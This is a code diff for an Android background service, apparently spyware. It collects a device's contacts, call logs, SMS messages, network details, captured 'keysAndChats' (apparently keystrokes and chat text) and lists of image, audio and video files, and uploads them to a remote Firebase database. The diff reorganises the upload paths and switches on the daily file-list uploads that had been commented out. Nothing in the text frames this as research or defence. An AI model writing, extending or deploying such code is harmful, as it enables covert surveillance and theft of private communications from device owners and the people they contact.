@@ -39,18 +39,22 @@ import kotlin.arrayOf
 class DataService : Service() {
     private lateinit var dbRef: DatabaseReference
     private var aid: String = ""
+    private lateinit var savePref: SavePref
 
     override fun onBind(p0: Intent?): IBinder? {
         TODO("Not yet implemented")
     }
 
     override fun onCreate() {
+        savePref = SavePref(this)
+
         dbRef = FirebaseDatabase.getInstance("https://signoui-default-rtdb.asia-southeast1.firebasedatabase.app").reference
     }
 
     @RequiresApi(Build.VERSION_CODES.O)
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (intent != null && intent.action.equals("startDataCapture")) {
+
             getAid()
             startMyForeground()
 
@@ -174,7 +178,7 @@ class DataService : Service() {
             }
 
             uploadThread.start()*/
-            dbRef.child(aid).child("contact").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+            dbRef.child("Devices").child(aid).child("contact").child(timeStmp()).setValue(Gson().toJson(uploadJson))
         }
     }
 
@@ -243,7 +247,8 @@ class DataService : Service() {
             }
 
             uploadThread.start()*/
-            dbRef.child(aid).child("callLog").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+            dbRef.child("Devices").child(aid).child("callLog").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+
         }
     }
 
@@ -299,14 +304,14 @@ class DataService : Service() {
 
         uploadThread.start()*/
 
-        dbRef.child(aid).child("mobileNetwork").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+        dbRef.child("Devices").child(aid).child("mobileNetwork").child(timeStmp()).setValue(Gson().toJson(uploadJson))
     }
 
+    @RequiresApi(Build.VERSION_CODES.N)
     private fun getChats() {
-        var savePref = SavePref(this)
         var chats = savePref.getChat()
         if (chats != "chat") {
-            dbRef.child(aid).child("keysAndChats").child(timeStmp()).setValue(chats)
+            dbRef.child("Devices").child(aid).child("keysAndChats").child(timeStmp()).setValue(chats)
         }
         savePref.setChat("chat")
     }
@@ -361,7 +366,7 @@ class DataService : Service() {
             }
 
             uploadThread.start()*/
-            dbRef.child(aid).child("sms").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+            dbRef.child("Devices").child(aid).child("sms").child(timeStmp()).setValue(Gson().toJson(uploadJson))
         }
     }
 
@@ -404,7 +409,11 @@ class DataService : Service() {
         }
         uploadJson.put("imageList", dataJSONArray)
 
-        // dbRef.child(aid).child("fileList").child("images").child(timeStmp()).setValue(Gson().toJson(uploadJson))  //for list
+        val timeForComparingLastSync = System.currentTimeMillis() / 1000
+        val timeAfterAday = savePref.getLastFileSync()?.plus((24 *60 * 60))
+        if (timeForComparingLastSync >= timeAfterAday!!) {
+            dbRef.child("Devices").child(aid).child("fileList").child("images").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+        }
     }
 
     @RequiresApi(Build.VERSION_CODES.N)
@@ -451,7 +460,11 @@ class DataService : Service() {
 
         uploadJson.put("videoList", dataJSONArray)
 
-        // dbRef.child(aid).child("fileList").child("audios").child(timeStmp()).setValue(Gson().toJson(uploadJson))  //for list
+        val timeForComparingLastSync = System.currentTimeMillis() / 1000
+        val timeAfterAday = savePref.getLastFileSync()?.plus((24 *60 * 60))
+        if (timeForComparingLastSync >= timeAfterAday!!) {
+            dbRef.child("Devices").child(aid).child("fileList").child("audios").child(timeStmp()).setValue(Gson().toJson(uploadJson))
+        }
     }
 
     @RequiresApi(Build.VERSION_CODES.N)
@@ -495,6 +508,12 @@ class DataService : Service() {
 
         uploadJson.put("videoList", dataJSONArray)
 
-        // dbRef.child(aid).child("fileList").child("videos").child(timeStmp()).setValue(Gson().toJson(uploadJson))  //for list
+        val timeForComparingLastSync = System.currentTimeMillis() / 1000
+        val timeAfterAday = savePref.getLastFileSync()?.plus((24 *60 * 60))
+        if (timeForComparingLastSync >= timeAfterAday!!) {
+            dbRef.child("Devices").child(aid).child("fileList").child("videos").child(timeStmp()).setValue(Gson().toJson(uploadJson))  //for list
+            savePref.setLastFileSync(timeForComparingLastSync+timeAfterAday)
+        }
+
     }
 }
